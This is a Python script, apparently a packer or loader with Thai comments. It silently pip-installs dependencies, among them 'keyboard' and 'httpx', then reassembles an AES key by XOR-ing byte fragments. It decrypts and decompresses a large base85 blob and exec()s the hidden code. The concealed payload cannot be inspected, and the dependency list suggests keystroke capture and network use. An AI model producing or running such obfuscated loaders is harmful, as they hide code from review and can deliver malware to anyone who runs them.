
import sys, base64, zlib, subprocess

def _req_check(p, m=None):
    if m is None: m = p
    try:
        __import__(m)
    except ImportError:
        print(f"[*] Installing dependency: {p}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", p, "--quiet"])

# ติดตั้งตัวถอดรหัสก่อน
_req_check("pycryptodome", "Crypto")

# ติดตั้ง Module ที่แสกนเจอจากโค้ดของคุณ
_needed = ['datetime', 'ctypes', 'httpx', 'ujson', 'rich', 'subprocess', 'keyboard', 'asyncio', 'os']
for mod in _needed:
    _req_check(mod)

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def _xor(p):
    from functools import reduce
    return reduce(lambda a,b: bytes(x^y for x,y in zip(a,b)), p)

_K = _xor([b'\xe2piv\xd3B>\x08B\x13m\xb4\xd0\xdb\x86\xd1\xeb\x12\x89\x9f\xc7\x04o\xcf%\x136cy*\xe9\x92', b'`\xe5j\xba~\x99\x91\xec^\xdd\x04\xebd\xee\x0b\x9b\xee\x99"$a\xa8$\xccr\x92&\xb9%M\x8c\t', b'\x19\xa9\xe9\xf7H"\x8b\x81\xdc9\xba\x8a\xcc9-\x19\x12\xd1m\x12\xe0.9+[K \xbey,"W'])
_I = _xor([b'\xb4\xb9\xebS3\x15\x848\x15\xa1w\x8e\xe0\xc5\xc2C', b'\xa2\x00\xc9\x02\x8b\x9c\xba\xa3\xfe\xef\xed%\xf8\x88s)'])

def _decrypt_str(d):
    iv, p = d[:16], d[16:]
    return unpad(AES.new(_K, AES.MODE_CBC, iv).decrypt(p), 16).decode("utf-8", "ignore")

def _decrypt_bytes(d):
    iv, p = d[:16], d[16:]
    return unpad(AES.new(_K, AES.MODE_CBC, iv).decrypt(p), 16)

_enc = base64.b85decode('y{jNjhMLzg7vnN~n}q!-@Bko|6WIXz%c-F4qM3DuW(s{F@E20Yxi(O~Pp8IAM8pXgDb$gEkwg(>AhT@<6W+MKzI7nw_IU+mgysh+D&AO8;bml!x0;ZAz5TnnR)B1F5r+@u4`x!cEe?^j8xSUu;79KRM<&vWNI}D~mY5DhZ)Vin`XZYflsI7%vk>kmV>J;R-7p>_ie2<A7M}#CU0F@dzufQ};?mC4w$jkX_Ke0v7OPuTuwEhl(VX5I;?D5WOm(CIBhtnRraWxODtAn6)MZb10q)Tb2uzsG4XGVp5`uKC($G*;j!N`a>s!x&mtPKtw3sTUN5TA#XzZ!sD`L8({b(g?EV)Aef%{_MQgQwjSbsdt-H5R24)P!0>+l#o@XBS19a;M-*lYj=P6u0$T`x&J)f;Jz{Bh~0L_pZ*(W_m3owoF$p@-+fl03yZwV%qd5i|?L=KS-%Hj~LrFa%U?7_Gmxj&W!++c;RcFz(wZ=*hCbxQvWuX4?6{SCjcVIm@F2v?}u`OgG#q68Iox@OK{VqhfahpLdLPM>>bu-EH7&N((OjBLMf>xhLz1Sk54FSL)$IETUb6wwo0ui_LUOW-=eIF~eb{j5OTK+Z_I6?<1uR|6#n0?$Ml1r;3bfhonS&9Ymm8ETfxj{GbiUN!i8i;7~<g=Fd~%s38JwpY&nmHG{mBh04~8k9~6oFBOFG!;fzrxbEZkCKRgX<W&9#^(kX7Wp7=1%zs{1q;Y|==AI0F<r|FUFwT8)>pPE_6tAJNNWfsG9o~(wVx()Zk8zOYPL@>;vH2GVg|pLG$K6K3+IP=!P;MxEYFi@xyMR%@t}^HrhjRYJk0#c7V1tdPuoU{S6Ss+?A-Oz+1K3L`nFwj;J9;BB!5n?N%k&LAxYGV+$*{&rWKxh2fXB>}6sgVV>sj85jZQJhcVwZ_N4ZM_xG7`4*Lz=aiS0`WJ_e&DRndx%3@ccRPjL4|n0NBCfoQ(ydbcj^%ybjnFtBI-VY!dqmKV?lQTRqhaK8t53r_l^`mc_IHfXu9=3l>JD#>t5uz+L6O`GMI<REW*jv)Qx%shjn?LzmFrT4ZSO*Ux3M3{t{oFWajX^BtUF(=|m5|KM}jW<IbOI@=!ibda~b#MciZ|PqX7^BKm&^}BQ2<rL2XyWgsn?2vv9E&O1sPXC)x`!Q~v@?R>_M+VlBT(1S0^F};b0U3=0yZELq_7tYzh^zLIYdHjw=^F3onWfmC{zzYjdZ?05N+aj^`X><NYtZT>===0xV6pXC1V6ey|$q&>d1CA+xfoP5nLu|Cg^6`(<>g$h8>_v;vBcz05VDiD#3?=Ck;?XRB4;tqm}l&*7LDS8?G-TdkeFoyfgUnq}}jku|b8IEVM{)vz=Wp3Si=8m_ML5Rq%z|Bcs@OzM2*n5tcmxhg9NI))SI-PEWAc)`y<Q6oiar%kL8dNUDN3_v@jeI7tJl1^#;GtrQ;%k5*pNW$tD<I0)IUsYc2K*0foIn%m{%q?pI9V1(x9;tonYk@*birvZln!xL>HXiq{h+*z&}h2je@SOx(TR&!jejq=D&0o%VjWBFC5pvU1E;02&)B$1wN$2D7!p2mno6PMC8Vc}))-K;9qZ?3WRBce_bhtXQ?+ph3EczzxEQ_^<=7#_`<5v@nNy1^%yssE9%wfUapBE7=6D?;VMljOyF%D)wz4&rV7$nziVhP6`bbWtngQ>GmAAY7n8|MX98nDsqNIs9UW^v{fVw;ma{vt#j?23?n}nKs+={Mw>B?)k&IWETS0L1G#oycm7`>%8jvKvTy|+u)oK<CEA%xmw*y4kCmXue3WowRN-5&oE9F+O-z^KZCdzN{qNp>XwsIhb5}$Ku!MU^#*uUu)~$qroG)+t5X%oV`a%=tk*&{oWqr!vtls~AGM`-FgduQ-_N}roUtG1`&Fs`Jl3pPP<`v5JEzb1*Y(dA2p<1Xo6FUuY}_FIQR?E%Y>;#Exo4j_=QZ{kUB*-!1itt4f9sj<(`Be(`g%IN7j=r=;Y#h?448WL103y{eSnoHiRZ$6_Co7?l`uIcK>d_-(EWb|HP<jlIUT;UPT~jPXeg;CdG>ZsUz+7cg#5Z@&K>T+2^L7nZgMoto2v@d{%Rmk*(4xT4vfPTpve%`GBC`b*VjR49C>Hc@0jaIAKvSr@kQ8IP%bOhS150=jh)Fn_zvIG*?blGpIbkdwUs$kQvxkeqpUf<P;GSF`Gr+BK7&#|Eo)9vW0%C9KlYW1d%0Cjr^H}f#Db}`8+f6gKH(Z5eTbD9XUojrY<0o7rSPj^3&of2TNLf-X4ORep)uio8d+<(E-&K{uioZSdkc$KCD3X{vyB*9!~WD^V?nbTsE{VN4xt{0oI>D$qI&CcX=BznuY5@kY!8{(JvzuE(OrpV{w5N-gR8{@5VWqL_tzLyAlh3C2;Xm`s^d1dF<emvJ9kgO0NDl+_6a9kfgCL4>H{xLa@?M}8>IG`6?vx+i+t9P2IQpE-S=wv;OQ<r3S~_jTn)K7RD1GSbH)ontZ|w%q-U4mc->b+i`lN>vxoo!IE(Gq3J;>V>;96U(tT=Q*3Tbv6-7}sVE)hgNHzNE`a)#yl8Mt(Z;aQEOb@=EeV9|M?-m2U73I>+`tg2rBqyZ}WH^1#&P2$nYhr!+giku+7pF?mOaPgtZ_l=LP+L*>pSq*BgIuMm4>(qgSUVzkT&Mg|MR}QRSy|w@c@1Y*cjI#lD8M&}vuaiipz74X{FdpDt>!!u?pA<;yMrxjTqJyQfkgS0R^3p|roTs0^tlzb%uG)RyMS)}H_NpIQU%bl{BZq^8r?j+2NZ8N<i&cLkb~&39?~rKxJhu(l#6Jxp=}9#wEw#eFn*Vbz00IG3nEMM8{1Atf}ow%UiZhe^7-8PIb~SOlXfP9j`0hZO^(kIGYtIn2ldibcR4WlWo}*W)d9g?)}5qt)`t9*bD8;fgKPA|6bY1!LT%ir{Bd2RHF7nC{~81jzJ7`<V%c(hP;WrDQ3Vdc4r|fS=s|KlFR|OkBT6*H@TI3wyEBkTJ+iv+Pf;#5n5YIp30gE+BE(3=Nd=&QkW8v`s~;|v;LOR3P``Bc&Z;0j=v3<2BQ-GWzhUv>Mc<|y95^v6X{!sj`3&8x^>%g2K;HQ5v^dcNI<I;bWw25VYym1FP&6-MRuF72%`CJYDb&%`651f?W<4+{l9%u=mUBz83zsw^ommSJ+muPBEl>n~A-xV_<KW@oYOc@Zp?x}__QQdP3|tEjkK&yXV~H;6v3LDQdGV@B>&K48Qxm8&cj*9~FVbM>0!teVBx7Ia=9O-O^H|=9e;v$+L{j>V?~S=k8-$BSA#A`!wlGI(EI%Yn58Dc0r3X!^%(RRgRfjxx$6?I!PiDTmuzt2zsUo;~-z#@31!#-}d45uaMejCs=_T7<A<F=OdYvojw3R-C!RE%@mEsuuvI1dsBVK<Ab}>1ydq1(`NfXa+*tcqaoNQ^NC+#1zTZT@unRdaf$@4QJ9X~~<3p);H<S=PsmSYgt#JB?LHw9)~Gd8uh!@?R&y~~{E*gwG%`RN}b6MP+dUxyZ0uQ>L~DVez&!+f=D&HtoPfQxZVkV~em_<}8Yq=Wz8EqKFnFJWyU_F0NocwP>G%fYszm*E4*aR=jRplL>$w%&b$J8--zM(ocCd(5uIFP*7_mPnni+ri&?B9@N<-QHW+P_$buvQy*)<qnL~Sr8-Rw~B3pzDx3vv}=AokM<({^wzdeK*H|WJ1vI4NDod;xKm*Uab%?Q;UK)@i|c3-Y2xLZSf<BR&&+<4Y@YD>=@i3^`s}~<jOHF&t}$k9{l#VMKLZseGXqxz`0aMqSsC+v@bQ;Q?lb6c84jTP1lFv*7XV?v<|p6~ex`L^5pxkQMDO%tMQl1SR?+ec)I(~C?^tG)JwoSZeEJ+cS25<DzQnL3D}uRw1|6%#q6N0<M3L%xY;Rn%>uBsIKOfQ^VOPcp;E#05<Wj?;AZp1}u1+K{MTm~{`XABsK0d!sX!Bi=tc}RnLO*Eij@*9pr~Wr_m-7D@oqf<ZBbG^uzaIFq-gjIKX|V>bomTtp2t^Qu*4w-&n4*JQFAS;MvQ*2J<UXo4=XX_`+rv>sFM5dy52&CPA5mynxwYLVkDX%zGZD(!SkT8zObT|pZ(7!$8_Xcp=uG9B`C52&;k2#!=;iriOP8uLIm6~`DAN8%CxZ{;{Nf5i;kEl7ND-Y@+}fEQQE(p$@kCe;JKB&{bJ_z~c=0=AW=zURTXjSsurTq^HM^38?%U#ebs>iMK9kR)99Z^Uwjy!}ep8^?KtT8YhZRe#LO|z{fP6q0iuJv1JQ2!lJ#hpa|AEy7{wI%}v}1>G$pYC@g_K_Gyg><v0B>6S#s<44l)NaMk9O8@NLxnr^CmA#ChEN<PZwdOb|W&nRP$JS;wA91ls><w04c3&g|t_2dr5_;_KWeZe6TI<!KbeeF{Y#+PIOyqxuPu^EK{1bgSG3Z$e(OlNIY;6r?U9hW-$!W$LD)gyVW(j`1c6bzZA5vKUg3*9<gb(28-lp*+NB>;6P&V3`Y=~;5w#-&hfu*3<=mWK|Pb<p5BLb`1PPx_*lTcE6%^$VCU3k6Z6E2p{Yj4N4HP+sgxwQMb18NRsb|#>t33rwYKnjdGgOT2z)u~y!gM#KDwWGwh&jyP$*tVRc~sm)LT;BXU>_F2m2_rNsrGXI+U}h{(miX9S~8NzZgLaO;Iq~G3VTnB*KkWkCeba3%2_Nlu9%(3n0?Up-H*Ov-lW5M_vRc78WC9j9W~?^khjjiCc-yFTE`gQH8>l9KFeFR+Jt~7=zIV>LX?avfhzD8I?PBd$0@NhNZ2tix~%oaiRWE7{H!!8YTlu29cQUu;;IHqIleF5dIM7Qg3sOXW?x?h1b*fEgEG?*Qm*j88_&t@fY&!qp=Q<!^iC8nyJet<o|T_L8<$R^%sp-$f#xGm?i07WLWStAEY)ib?-SYBJaP&ybi?^sQRleW3<y8GmP=r?+!Z_m4`5Z*wfrI8NtLLlZ;horkeLh-&m2#t@MCbM+*g-l1Vh7q?7hKh|%X|Qv9pN&V<lalyVHn0~LrpIg;ZwuUtzRM))}8Q-9`G4b9Y<yYYk)(o@IBvpU!BsxZqjvrV)E`5{=gH7pU!B#;vB-hps^c>C@WiUTp}Be)GFrUK`FD)L3woeM|;QuS;xv-zoe8Z<B`4upZo<}nO5c^)D59p_e@S3MPTej1ZFi92+>GIS&&h|Urtp`!=4C>!whXUr`ka5G#83ESUDn@msfYk7y%<Ni0$4gz%@T4nh5Tz-v6-z9=CD@EJX)>a^c;X%W9Z7TjY(rhkvP@3a@P`T;hqR*LfdjlBs0Z&!2Mm)3tLNcYi5`ejhQDYnAh%rV?AvI)PucKvq^Oj_?U?T4?X5VXbW@$_LHnZgILSp4^e^qk-HU;Jq3-RJ5Sq+J0fO8en1Lh=i_40+31v*btm4zE`S61Mjl=-NcfpQBM51!^9XXrsEgi7#({1`vLi=$nwEF^p0-oFfU8F&6Y?J3kz<fGmb%dCs+dY1`Q&#l~`A+)<s!Q;L`NUoz$9^k(*^=tpz8_I;~Vsa4Qo2Fy9alJX2PSs+h?WZ!cmmO%us^SoA?mMW&ZV~l4HJ&8u+$)jS33rY0SQK{kjbs(VlR4q+TGzGjummVXZ3S$mQiz=<iHi6|#U4yVX}(knixCg(R|`A;RjxsE>+3aZJV*znf(4d`XL;wOhXn}@EB39&i9U)4AkntcL`UHb|Fh%<;e*x4yO9Dj6EEu%v`U-vHc~l(sZ*(II047b<rSq6vzP3Ms!E#c!L6rD{et0$dOB=gk>9)F$)c`U7MKR*J%ZF~A(#Bk>a%!<LRJCfZ9}>TvUEMeT7E5Fr;Jc}pW0F3$X20k5s+>MBf99`3Vlx<wPqm{kF*YDA4QkhVLFF6f6f@>%qrWpP#9K=fLaPE2;;GWQDDN>mpZt2oZ%XNTam8|?wmg<4=0ka@2y&H!H91S;tKvV{+AImWz~<4`rn`$2y;5734_Xm*Pr8_zNUHU#8NIWUE8Fls}>IawsE!YMa9GQDv10AB9mz%vr9=%DKoA!K*Ss8&U&c2J!QDFJCxzU{4EFgy?n&uvt?{5YR&d5W>a?)`)%SDB~8eh7?>-JBC)%?4b9e!0S<M*fO5fMoVgVI2)`U#K|`luWCp&-PTp>Br?-V)USAzn((acbbD5@g=H~Nl*U@@}iN6-+Wp>0sz^|9dQ{1Yd6Fr}h(!q(XN@KNn*`79i')
_raw = unpad(AES.new(_K, AES.MODE_CBC, _I).decrypt(_enc), 16)

# EXECUTE UNIVERSAL CODE
exec(zlib.decompress(_raw).decode('utf-8'), {
    "__name__": "__main__",
    "__builtins__": __builtins__,
    "_decrypt_str": _decrypt_str,
    "_decrypt_bytes": _decrypt_bytes,
})
